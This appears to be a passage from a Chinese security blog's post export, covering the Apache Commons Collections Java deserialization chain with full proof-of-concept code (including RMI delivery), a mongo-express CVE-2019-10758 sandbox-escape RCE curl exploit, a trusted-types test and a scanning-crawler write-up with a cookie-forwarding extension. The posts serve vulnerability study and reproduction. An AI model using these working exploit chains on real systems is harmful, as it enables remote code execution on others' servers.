unserialize(); obj.transform(Runtime.getRuntime()); &#125; public static void serialize(InvokerTransformer obj)&#123; try &#123; ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser")); os.writeObject(obj); os.close(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static Object unserialize()&#123; try &#123; ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser")); return is.readObject(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; step2: 反射链构造这意味着Runtime.getRuntime()的调用也需要我们通过反射来进行调用，而InvokerTransformer的tansform函数一次只能进行一次反射，这就需要我们构造一个反射链，最终调用exec函数进行命令执行。 在 /commons-collections-3.1-sources.jar!/org/apache/commons/collections/functors/ChainedTransformer.java 中提供了我们构造一个函数对象调用链的一个方法：1234567891011121314public class ChainedTransformer implements Transformer, Serializable &#123; // 109行 public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers; &#125; public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object; &#125;&#125; 给ChainedTransformer方法传递一个数组，在transform方法里遍历调用其transform方法，并将返回的结果作为下一次transform函数的参数。 此时可以构造出这样一个poc：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package test2;import java.io.*;import java.lang.Runtime;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;public class test2 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //反射调用exec方法 new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open -a Calculator"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); serialize(transformerChain); // 通过进一步构造反射链，这里的transform传递一个空参数即可。 Transformer transformer = (Transformer) unserialize(); transformer.transform(""); &#125; public static void serialize(Transformer obj)&#123; try &#123; ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser")); os.writeObject(obj); os.close(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static Object unserialize()&#123; try &#123; ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser")); return is.readObject(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; return null; &#125;&#125; 在Transformer数组的第一个元素中用到了ConstantTransformer类：1234567891011public class ConstantTransformer implements Transformer, Serializable &#123; // 64行 public ConstantTransformer(Object constantToReturn) &#123; super(); iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return iConstant; &#125;&#125; 通过初始化对象传入Runtime.class类作为参数，然后在ChainedTransformer类遍历数组调用其 ConstantTransformer的transform方法返回Runtime类。 从transformer.transform(&quot;&quot;);下断点跟进： 遍历数组，第一次进入ConstantTransformer的transform函数： ConstantTransformer的transform返回在实例化时传入的Runtime类： 第二次循环，将第一次返回的Runtime类作为参数，带入第二次InvokerTransformer类的transform函数参数中：这里通过java反射机制，从Runtime类找到其getRuntime方法，返回Runtime.getRuntime()方法，作为下次循环的参数。 第三次循环再次通过InvokerTransformer类的transform方法，通过反射调用invoke方法，真正的执行getRuntime函数并返回Runtime实例 在第四轮中我们可以看到object参数变成了Runtime对象，并且通过反射调用exec函数来进行命令执行：最后执行命令： step3：寻找自动触发transform在step2的poc中我们可以看到，反序列化之后其实还有一个对对象进行transform函数的调用，虽然此时已经通过反射链解决了Runtime.getRuntime()的参数传入问题，但是仍然需要我们调用transform函数。12Transformer transformer = (Transformer) unserialize();transformer.transform(""); 这样的条件在实际环境中是难以利用的，我们希望的是仅调用readObject函数就能够触发漏洞，即需要寻找一个有被重写的readObject函数，而其中的流程能够触发transform函数(可以直接搜索这两个关键字寻找)。 在/org/apache/commons/collections/map/TransformedMap.java中:1234567891011121314151617181920212223//65行 public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer); &#125;//87行 protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; &#125;//137行 protected Object transformValue(Object object) &#123; if (valueTransformer == null) &#123; return object; &#125; return valueTransformer.transform(object); &#125;//183行 public Object put(Object key, Object value) &#123; key = transformKey(key); value = transformValue(value); return getMap().put(key, value); &#125; 通过TransformedMap函数设置成员变量，通过调用put函数，触发transformValue函数的valueTransformer.transform(object)调用。poc：12345678910111213141516 public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app/"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChain Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put("value", "value");&#125; 虽然找到了一个能自动调用transform的过程，但是要实现反序列化命令执行，还需要有对map的操作。这里还有另外一处也有调用transform方法的功能：1234// 168行protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);&#125; 在其父类/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java中实现了一个静态类的定义：12345678910111213141516// 180行 static class MapEntry extends AbstractMapEntryDecorator &#123; /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); // 调用点 return entry.setValue(value); &#125; &#125; 这里用了java类的嵌套，和php语言特性有点区别：https://blog.csdn.net/hguisu/article/details/7270086 step3: 寻找重写readObject在jdk小于等于1.7的时，/sun/reflect/annotation/AnnotationInvocationHandler.class中的readObject中有对map的修改功能。 这里便于分析，用jd-gui将其jar包逆向：/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jar这里readObject方法，使用了entry.setValue方法。 在构造方法中，我们可以看到其将实例化传入的参数设为其成员变量this.memberValues,接着在反序列化的时候，通过对readObject的调用，触发MapEntry的setValue方法。 最后poc用了java反射去实例化创建对象，构造出一个完整的攻击链：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package test;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.util.HashMap;import java.lang.reflect.Constructor;import java.util.Map;public class test &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app/"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put("value", "2"); // 满足/org/apache/commons/collections/map/AbstractMapDecorator.java的null判断,但是不知道为什么键名一定要是value，调了很多次还是没解决，求解 Map transformedmap = TransformedMap.decorate(map, null, transformerChain); // 加载类 Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); // 实例化 Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); // 获取指定的构造方法 cons.setAccessible(true); //为反射对象设置可访问标志 Object ins = cons.newInstance(java.lang.annotation.Retention.class,transformedmap); // 序列化 ByteArrayOutputStream exp = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(exp); oos.writeObject(ins); oos.flush(); oos.close(); ByteArrayInputStream out = new ByteArrayInputStream(exp.toByteArray()); ObjectInputStream ois = new ObjectInputStream(out); Object obj = (Object) ois.readObject(); &#125;&#125; 流程：参考seebug的一张图 远程利用实现先学习几个概念： RMI(Remote Method Invocation)是一种基于序列化Java远程方法调用机制，作为一个常见的反序列化入口，和反序列化漏洞有密切联系。利用这种机制可以让某台服务器上的对象在调用另外一台服务器上的方法时，和在本地机上对象间的方法调用的语法规则一样。 JNDI（Java Naming and Directory Interface），Java 命名与目录接口，JNDI支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI等。(还有很多概念，先挖坑) RMI服务端实现构造一个User接口：User.java12345678910package RMI;import java.rmi.Remote;import java.rmi.RemoteException;public interface User extends Remote&#123; String name(String name) throws RemoteException; void say(String say) throws RemoteException; void dowork(Object work) throws RemoteException;&#125; 实现User接口：UserImpl.java1234567891011121314151617181920212223package RMI;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class UserImpl extends UnicastRemoteObject implements User&#123; public UserImpl() throws RemoteException&#123; super(); &#125; @Override public String name(String name) throws RemoteException&#123; return name; &#125; @Override public void say(String say) throws RemoteException&#123; System.out.println("you speak" + say); &#125; @Override public void dowork(Object work) throws RemoteException&#123; System.out.println("your work is " + work); &#125;&#125; 实现Server端：1234567891011121314package RMI;import java.rmi.Naming;import java.rmi.registry.LocateRegistry;public class UserServer &#123; public static void main(String[] args) throws Exception&#123; String url = "rmi://192.168.43.112:4396/User"; User user = new UserImpl(); LocateRegistry.createRegistry(4396); Naming.bind(url,user); System.out.println("the rmi is running :" + url); &#125;&#125; 运行监听： 客户端UserClient:123456789101112131415161718192021222324252627282930313233343536373839404142package RMI;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.rmi.Naming;import java.util.HashMap;import java.util.Map;public class UserClient &#123; public static void main(String[] args) throws Exception&#123; String url = "rmi://192.168.43.112:4396/User"; User userClient = (User)Naming.lookup(url); System.out.println(userClient.name("test")); userClient.say("world"); userClient.dowork(getpayload()); &#125; public static Object getpayload() throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;), new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open -a Calculator"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put("value", "test"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, transformedMap); return instance; &#125;&#125; 最后最后的transform函数调用使用了jdk1.7底层jar包，所以在不同的jdk版本利用链有所差异(挖坑)，同时这个漏洞的关键在于/org/apache/commons/collections/functors/InvokerTransformer.java可以通过反射调用任意函数，官方发布的新版本中增加了对相关反射调用的限制，同时对这些不安全的Java类的序列化支持增加了开关(也就是黑名单)。 java项目因为其可以加载很多依赖jar包，导致其反序列化可以寻找的攻击范围很广，从依赖扩展到jdk库，这也是java比php反序列化难的地方。 此外，简单学习了一些java语法后就开始分析漏洞，很多java语法特性以及概念不太熟悉，比如反射、嵌套类、JMX、JNDI等等，接下来打算好好弥补一下这方面的短板。 参考： https://www.xmanblog.net/java-deserialize-apache-commons-collections/ https://xz.aliyun.com/t/4558#toc-0 https://xz.aliyun.com/t/4711]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSP:trusted-types 初体验]]></title>
    <url>%2F2020%2F01%2F14%2FCSPtrusted-types%20%E5%88%9D%E4%BD%93%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[文章首发先知社区 之前被问到这样一个有意思的问题，为什么新版Chrome取消了XSS Audit机制？ 以前看到过文章说新版Chrome取消这个的原因是因为被绕过的姿势过多(我也不知道几个)或者说是误报影响到正常功能了。并说用trusted-types的API替换XSS Audit能彻底杜绝DOM XSS。 仔细跟了一下谷歌的开发文档介绍，通过给CSP配置一个trusted-types属性：1Content-Security-Policy: trusted-types * 本地测试79.0版本：12345678910111213141516&lt;?phpheader("Content-Security-Policy: trusted-types *");$a= &lt;&lt;&lt;EOF&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;script&gt;const templateId = location.hash.match(/tplid=([^;&amp;]*)/)[1];// typeof templateId == "string"document.head.innerHTML += decodeURI(templateId) // Throws a TypeError.&lt;/script&gt;&lt;/html&gt;EOF;echo $a; 但是并没有抛出错误，继续翻了下文档，找到问题所在:需要用Chrome73-78的版本，其次默认配置是不开的，访问chrome://flags/#enable-experimental-web-platform-features将其配置打开。 这里用Chrome78测试： 抛出一个错误，强制要求我们使用TrustedHTML，修改代码：1234567891011121314151617181920212223242526&lt;?phpheader("Content-Security-Policy: trusted-types *");$a= &lt;&lt;&lt;EOF&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;script&gt;const templatePolicy = TrustedTypes.createPolicy('template', &#123; createHTML: (templateId) =&gt; &#123; const tpl = templateId; if (/^[0-9a-z-]$/.test(tpl)) &#123; return `&lt;link rel="stylesheet" href="./templates/\$&#123;tpl&#125;/style.css"&gt;`; &#125; throw new TypeError(); &#125; &#125;);const html = templatePolicy.createHTML(location.hash.match(/tplid=([^;&amp;]*)/)[1]);// html instanceof TrustedHTMLdocument.head.innerHTML = html;&lt;/script&gt;&lt;/html&gt;EOF;echo $a; 通过TrustedTypes.createPolicy自定义过滤后，return一个TrustedHTML来满足CSP的可信要求： 最后在Chrome79下,即使我们开启了Experimental Web Platform features这个配置，仍然会遇到TrustedTypes is not defined的问题，emm可能功能正在试验中，然后新版又给移除了？ 其次因为这个问题测试的时候，Chrome会默认更新到79版本有点烦，去这里，找了个78版本的下载，接着输msconfig把谷歌服务的更新关了即可最后打开Chrome效果是这样的： 最后简单总结一下，Chrome取消了XSS Auditor，取而代之的是trusted-types可信API，声称可以彻底杜绝DOM XSS，经过一番体验后，其实本质上为强制开发写一段更为严格的过滤规则。 拭目以待，看看之后谷歌有什么新的想法~]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>前端安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-10758 mongo-express RCE复现分析]]></title>
    <url>%2F2020%2F01%2F08%2FCVE-2019-10758%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[复现过程拉一个MongoDB的docker镜像：1docker run -p 27017:27017 -d mongo 本地npm init创建个package.json，接着添加依赖库`mongo-express@0.53.0,npm install`安装123&quot;dependencies&quot;: &#123; &quot;mongo-express&quot;: &quot;0.53.0&quot;&#125;, EXP:1curl &apos;https://localhost:8081/checkValid&apos; -H &apos;Authorization: Basic YWRtaW46cGFzcw==&apos; --data &apos;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&apos; 漏洞分析先来看看checkValid这个路由：lib/router.js#279行 跟进checkValid函数：lib/routes/document.js#28 获取post的的doc参数，使用bson库进行BSON数据转换。 BSON是一种计算机数据交换格式，主要被用作MongoDB数据库中的数据存储和网络传输格式。它是一种二进制表示形式，能用来表示简单数据结构、关联数组（MongoDB中称为“对象”或“文档”）以及MongoDB中的各种数据类型。BSON之名缘于JSON，含义为Binary JSON（二进制JSON） 跟进toBSON函数：lib/bson.js#54在第60行进入vm沙箱eval操作。 使用this.constructor.constructor逃逸沙箱，参考https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html，使用this指向VM容器外，使用.constructor指向构造器，访问构造器的构造器对象，创建一个构造函数。 demo:12345"use strict";const vm = require("vm");const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator').toString()`);console.log(xyz); 修复官方修复删除了vm库的引用：https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2 参考： CVE-2019-10758:mongo-expressRCE复现分析 CVE-2019-10758 POC Sandboxing NodeJS is hard, here is why https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function https://dfkaye.github.io/2014/03/14/javascript-eval-and-function-constructor/ https://github.com/i0natan/nodebestpractices/issues/211]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇)]]></title>
    <url>%2F2020%2F01%2F08%2FNodeJS%20Headless%20%E5%8A%A8%E6%80%81%E6%BC%8F%E6%89%AB%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95(%E7%88%AC%E8%99%AB%E7%AF%87)%2F</url>
    <content type="text"><![CDATA[文章首发先知社区：https://xz.aliyun.com/t/7064 在两年前谷歌推出了一个Headless Chrome NodeJS API:Puppeteer，后来Github一个大牛用Python封装了一套api，作为一个第三方api:Pyppeteer。 在去年的时候，尝试过用Pyppeteer写过动态爬虫，Python版由于是第三方一个作者封装的，更新很慢，落后官方版本很多，很多迷之BUG，比如CDP协议去操作远程chromium，很容易中断导致一堆僵尸进程的chromium关不掉。虽然最后还是顶着各种bug，写成一个勉强能用的工具，但在服务器上很吃内存，一方面也是因为写的任务调度机制也有一些问题，最后服役了许多天天，不想维护了，捡了几个漏洞就退休了。后来在平时的工作和学习中频频接触到nodeJS，于是就趁着这段时间用nodejs重新实现一遍。 JS基础JS中的事件模型分为：内联、DOM0级、DOM2级事件 JS原型链介绍Js是一种基于原型的语言，每一个对象都有一个原型对象，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，一层一层、以此类推。在传统的面向对象编程中，我们首先会定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。但在 js 中并不是像这样复制，而是在对象实例和类之间之间建立一个链接。demo:12345function Cat() &#123; this.color = 'test'&#125;var cat = new Cat()console.log(cat.__proto__ === Cat.prototype) // true 在 JavaScript 中，如果想访问某个属性，首先会在实例对象（cat）的内部寻找，如果没找到，就会在该对象的原型（cat._proto_，即 Cat.prototype）上找，我们知道，对象的原型也是对象，它也有原型，如果在对象的原型上也没有找到目标属性，则会在对象的原型的原型（Cat.prototype._proto_）上寻找，以此内推，直到找到这个属性或者到达了最顶层。在原型上一层一层寻找，这便是原型链了。 如何抓取更多的URL几种思路，可以直接使用正则抓取，也可以解析各种含有链接的标签，也就是src,href属性等。当然这些都有一定的缺陷，比如相对路径需要单独去处理成完整URl，有的使用的js跳转，而不把URl写到标签内等等。另一种思路即使用动态爬虫的思路，Hook JS，通过触发各种事件信息收集URL。这里计划第一版爬虫先实现简易的URL抓取，之后再进一步优化。首先最常想到的是使用正则抓取，其次可以利用Headless的优势，将动态JS渲染的链接标签、属性抓取。 收集src、href属性的标签12345678910111213141516171819function getSrcAndHrefLinks(nodes) &#123; let result = []; for(let node of nodes)&#123; let src = node.getAttribute(&quot;src&quot;); let href = node.getAttribute(&quot;href&quot;); let action = node.getAttribute(&quot;action&quot;); if (src)&#123; result.push(src) &#125; if (href)&#123; result.push(href); &#125; if(action)&#123; result.push(action); &#125; &#125; return result;&#125;const links = await page.$$eval(&apos;[src],[href],[action]&apos;, getSrcAndHrefLinks); 爬行结果： 接着通过简单的URL去重、清洗，爬虫便可以进行迭代爬行了。 经过一番测试后发现，对于下面这种页面URL抓取是会有遗漏的： 有的将跳转操作全写入了js事件中，或者有的要进行页面滚动JS才会进一步渲染，无疑遗漏了很多URL。解决这些问题的关键在于模拟用户操作，而用户操作的本质则为触发各种DOM事件。所以接下来需要解决的问题在于收集各种DOM事件，以及去触发它们。 收集DOM事件在学习收集DOM事件的过程中参考了9ian1i师傅以及fate0师傅文章，很感谢前辈们的拓荒。 Hook事件注册事件分为DOM0和DOM2事件，使用方法不同，收集方法也有差异。这里简单介绍了两者的差异DOM0级事件和DOM2级事件区别。以及JavaScript Prototype Chain 原型链学习DOM0对于DOM0的事件监听，可以修改所有节点的相关属性原型，设置其访问器属性。demo:12345678910function dom0Hook(that, event_name) &#123; console.log("tagname: " + that.tagName + ", event_name:" + event_name);&#125;Object.defineProperties(HTMLElement.prototype, &#123; onclick: &#123;set: function(newValue)&#123;onclick = newValue;dom0Hook(this, "click");&#125;&#125;, onchange: &#123;set: function(newValue)&#123;onchange = newValue;dom0Hook(this, "change");&#125;&#125;&#125;); $0 = document.getElementsByTagName("a"); $0[0].onclick = function()&#123;console.log("a")&#125; DOM2DOM2级事件Hook，可以通过修改addEventListener的原型即可：12345let oldEvent = Element.prototype.addEventListener;Element.prototype.addEventListener = function(event_name, event_func, useCapture) &#123; console.log("tagname: " + this.tagName + ", event_name:" + event_name); oldEvent.apply(this, arguments);&#125;; 内联事件除了上述两种绑定事件的办法，还有通过写在标签内的内联事件，无法通过Hook来收集。比如：1&lt;div id="test" onclick="alert('1')"&gt;123&lt;/div&gt; 解决办法是通过遍历节点，执行on事件：123456789101112131415161718function trigger_inline()&#123; var nodes = document.all; for (var i = 0; i &lt; nodes.length; i++) &#123; var attrs = nodes[i].attributes; for (var j = 0; j &lt; attrs.length; j++) &#123; attr_name = attrs[j].nodeName; attr_value = attrs[j].nodeValue; if (attr_name.substr(0, 2) == "on") &#123; console.log(attrs[j].nodeName + ' : ' + attr_value); eval(attr_value); &#125; if (attr_name in &#123;"src": 1, "href": 1&#125; &amp;&amp; attrs[j].nodeValue.substr(0, 11) == "javascript:") &#123; console.log(attrs[j].nodeName + ' : ' + attr_value); eval(attr_value.substr(11)); &#125; &#125; &#125;&#125; 或者TreeWalker获取全部节点，用dispatchEvent挨个触发事件而DOM0、DOM2级事件通过收集到的标签和事件名依次触发即可。 导航锁定触发事件的过程中，可能会被意外的导航请求给中断操作，所以我们应当取消非本页面的导航请求，避免造成漏抓。前端JS跳转取消跳转操作，记录跳转URL，但是Chrome不允许我们通过Object.defineProperty重定义window.Location操作，即无法通过Hook获取跳转的URL。 搜索了一些资料之后大致有下边一些解决办法： 修改Chromium默认location属性的configurable为true 加载自定义插件 使用puppeteer的拦截器返回204状态码 但最后我选择了为漏扫动态爬虫定制的浏览器，后边会细说。 后端跳转请求体无内容，则跟进；请求体有内容，则渲染页面，记录跳转url。 表单填充锁定重置表单事件12345HTMLFormElement.prototype.reset = function() &#123; console.log("cancel reset form")&#125;;Object.defineProperty(HTMLFormElement.prototype, "reset", &#123;"writable": false, "configurable": false&#125;); 挖坑 为漏扫动态爬虫定制的浏览器解决这个前端导航hook问题的时候，发现github上有一个大牛通过修改源码实现了一个为漏扫定制版的Chrome。作者通过修改chromium源码实现了导航的Hook，禁止页面的天锻跳转并收集其跳转的URL，并且通过底层hook了所有非默认事件，为我们开发提供了很多便利。 但还是有一些小的地方需要我们自己优化一下，会锁定导航自动收集前端跳转URL，但不会处理后端的Location，这里我们用一个拦截器去实现，记录后端跳转，加入扫描队列： 12345678910await page.on('response', interceptedResponse =&gt;&#123; let status = interceptedResponse.status(); if(status.toString().substr(0,2) === "30")&#123; console.log("url: " + interceptedResponse.url()); console.log("status: " + status); console.log("headers: " + interceptedResponse.headers().location); // 添加进任务队列 cluster.queue(interceptedResponse.headers().location); &#125;&#125;); 事件触发&amp;收集结果1234567891011121314151617181920212223function executeEvent() &#123; var firedEventNames = ["focus", "mouseover", "mousedown", "click", "error"]; var firedEvents = &#123;&#125;; var length = firedEventNames.length; for (let i = 0; i &lt; length; i++) &#123; firedEvents[firedEventNames[i]] = document.createEvent("HTMLEvents"); firedEvents[firedEventNames[i]].initEvent(firedEventNames[i], true, true); &#125; var eventLength = window.eventNames.length; for (let i = 0; i &lt; eventLength; i++) &#123; var eventName = window.eventNames[i].split("_-_")[0]; var eventNode = window.eventNodes[i]; var index = firedEventNames.indexOf(eventName); if (index &gt; -1) &#123; if (eventNode != undefined) &#123; eventNode.dispatchEvent(firedEvents[eventName]); &#125; &#125; &#125; let result = window.info.split("_-_"); result.splice(0,1); return result;&#125; 添加cookie对于使用SSO单点站点体系而言，可以在开始爬行之前指定一段cookie，比如从文本中读取。但是对于爬行目标较为多且SSO的覆盖面有限的情况下，就得使用数据库了。在测试过程中遇到了另一个问题，就是并发过高，或者发送有害的payload，会有Cookie失效的问题，这里想到了一种比较实用的解决办法，写一个浏览器插件及时将当前页面的cookie同步到服务端数据库，然后爬虫定期从数据库中更新最新的cookie。 Chrome插件同步cookie12345678910111213141516171819function updateCookie(domain, name , value)&#123; let api = "https://127.0.0.1/add-cookie"; $.post(api, &#123; "domain": domain, "name": name, "value": value, &#125;, function (data, status) &#123; console.log(status); &#125;);&#125;/* * doc: https://developer.chrome.com/extensions/cookies */chrome.cookies.onChanged.addListener((changeInfo) =&gt;&#123; // 记录Cookie增加，Cookie更新分两步，第一步先删除，第二步再增加 if(changeInfo.removed === false)&#123; updateCookie(changeInfo.cookie.name, changeInfo.cookie.value, changeInfo.cookie.domain); &#125;&#125;); 相似URL去重去重在爬虫中是一个较为核心功能，规则过于宽松可能导致爬行不完或者说做一些无意义的重复爬行，规则过于严格则可能导致抓取结果过少，影响后续抓取和漏洞检测。去重一般分为两步对爬行队列去重，或者对结果集去重。 在解决这个问题的时候，参考了Fr1day师傅【技术分享】浅谈动态爬虫与去重的URL去重思路。不失为一种比较便捷，能基本满足当前需求的一种解决办法。 参数分析大致有以下几种参数：类型int、hash、中文、URL编码1234?m=home&amp;c=index&amp;a=index?type=202cb962ac59075b964b07152d234b70?id=1?msg=%E6%B6%88%E6%81%AF 根据不同的类型对其进行处理： 纯字母：中参数的值表示不同的路由功能，需要对这种参数进行保留 字母数字混合：可能是用户的hash，也可能具有路由功能，可根据任务量情况选择性保留 纯数字、URl编码：进行去重 处理结果即：1234?m=home&amp;c=index&amp;a=index?type=&#123;hash&#125;?id=&#123;int&#125;?msg=&#123;urlencode&#125; 然后在数据库中将相同的清洗掉即可。 相似页面去重相似度计算，监控资产变化网页结构相似度:https://xueshu.baidu.com/usercenter/paper/show?paperid=232b0da253211ecf9e2c85cb513d0bd3&amp;site=xueshu_se 挖坑 性能优化图片资源优化禁止浏览器加载图片 =&gt; 返回一个fake img实际测试过程中，有的网站在加载图片失败后，会尝试重新加载，这样会陷入一个死循环，导致发送大量数据包，占用性能。 代码：1234567891011121314151617const browser = await puppeteer.launch(launchOptions);const page = await browser.newPage();await preparePage(page);await page.setRequestInterception(true); // 开启拦截功能await page.on('request', interceptedRequest =&gt; &#123; // 拦截图片请求 if (interceptedRequest.resourceType() === 'image' || interceptedRequest.url().endsWith('.ico')) &#123; //console.log(`abort image: $&#123;interceptedRequest.url()&#125;`); let images = fs.readFileSync('public/image.png'); interceptedRequest.respond(&#123; 'contentType': ' image/png', 'body': Buffer.from(images) &#125;); &#125; else &#123; interceptedRequest.continue(); &#125; 拦截logout请求避免爬虫爬行到登出链接，导致Cookie失效，这里做一个简单的拦截：12345678await page.on('request', interceptedRequest =&gt; &#123; if(interceptedRequest.url().indexOf("logout") !== -1)&#123; interceptedRequest.abort(); &#125; else&#123; interceptedRequest.continue(); &#125;&#125;); puppeteer并发异步调度方案简单粗暴，这里使用puppeteer-cluster库解决单Chrome多tab并发需求，也可以参考使用guimaizi师傅的demo:puppeteer异步并发方案 开源这里边其实还有很多坑要填，师傅们多指点交流~开源链接：https://github.com/Passer6y/CrawlerVuln（求star 待实现的需求弹窗取消 代码注入时间链接收集有点不太全，触发完了事件后得等一会再收集url。 待解决的bugpage.once 确定抓取链接时间]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECShop 2.x 3.0代码执行漏洞分析]]></title>
    <url>%2F2019%2F09%2F30%2FECShop%202.x%203.0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
